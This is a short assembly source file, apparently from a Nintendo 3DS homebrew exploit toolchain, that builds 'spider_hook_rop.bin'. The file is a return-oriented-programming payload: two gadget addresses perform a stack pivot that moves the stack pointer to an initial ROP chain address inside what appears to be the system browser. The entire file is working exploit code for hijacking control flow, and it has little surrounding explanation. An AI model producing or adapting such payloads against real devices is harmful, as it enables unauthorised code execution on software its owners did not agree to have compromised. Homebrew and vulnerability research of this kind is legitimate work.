.nds

.include "../../build/constants.s"

.create "spider_hook_rop.bin",0x0

.orga 0x0
	.word 0x001303a4 ; pop {lr, pc}
		.word SPIDER_INITIALROP_VADR ; lr => sp
	.word 0x001303a0 ; mov sp, lr | pop {lr, pc}

.Close
